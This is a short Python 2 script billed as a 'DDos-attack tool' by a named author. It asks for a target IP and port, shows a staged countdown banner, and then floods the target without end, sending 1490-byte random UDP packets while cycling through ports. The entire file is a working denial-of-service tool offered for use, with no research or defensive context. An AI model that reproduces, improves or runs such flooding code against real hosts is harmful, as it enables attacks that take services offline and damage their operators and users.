# -*- coding: utf-8 -*-
import sys
import os
import time
import socket
import random
class bcolors:
	HEADER = '\033[95m'
	OKBLUE = '\033[94m'
	OKGREEN = '\033[92m'
	WARNING = '\033[93m'     #Defining Colors
	FAIL = '\033[91m'
	ENDC = '\033[0m'
	BOLD = '\033[1m'
	UNDERLINE = '\033[4m'
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
prompt = bcolors.OKBLUE + 'DDos-attack tool@:' + bcolors.ENDC + ' '
#############

os.system("clear")
os.system("figlet DDos Attack Tool ")

print ' '
print prompt + "Author   : Aziz_Virus"
print prompt + "github   : https://github.com/AzizVirus"
print prompt + "Facebook : Aziz Bécha"
print ' '
ip = raw_input(prompt + "{*} Select The IP Target : ")
time.sleep(0.25)
print ' '
print prompt + '{+} IP succesfully selected ! ==> ' + ip
print ' '
port = input(prompt + "(" + ip +  ")" + " > " +  "{*} Select The Port       : ")
print prompt + "(" + ip + ")" + " > " +  "{+} Port Selected ! " 
print prompt + "(" + ip + ")" + " > " + "{+} Everything Now IS OK! "
print ' '
os.system("clear")
os.system("figlet Starting Attack ")
print ' '
print prompt + "(" + ip + ")" + " > " +  "[                    ] 0% "
time.sleep(0.25)
print prompt + "(" + ip + ")" + " > " +  "[=====               ] 25%"
time.sleep(0.25)
print prompt + "(" + ip + ")" + " > " +  "[==========          ] 50%"
time.sleep(0.25)
print prompt + "(" + ip + ")" + " > " +  "[===============     ] 75%"
time.sleep(0.25)
print prompt + "(" + ip + ")" + " > " +  "[====================] 100%"
print " "
print " "
time.sleep (1.5)

print bcolors.FAIL + '|-------------===[***'                                                                                                                                        
print bcolors.FAIL + '|EXPLOITING ' +ip+ '\ '                                                                                                                                        
print bcolors.FAIL + '|_____________\_______ '                                                                                                                                       
print bcolors.FAIL + ('|==[ DDoS Attack ]===\.')                                                                                                                                          
print bcolors.FAIL + '|______________________\    '                                                                                                                                      
print bcolors.FAIL + '\(@)(@)(@)(@)(@)(@)(@)_/     '                                                                                                                                      
print bcolors.FAIL + '********************* \_     '
print ' '
print ' '
time.sleep (0.75)
print prompt + 'Attack Starts After 3'
print ' '
time.sleep(1)
print prompt + 'Attack Starts After 2'
print ' '
time.sleep(1)
print prompt + 'Attack Starts After 1'
print ' '
time.sleep(1)
print prompt + ' Started!'
time.sleep(0.75)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print prompt + "(" + ip + ")" + " > " + " [+] Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
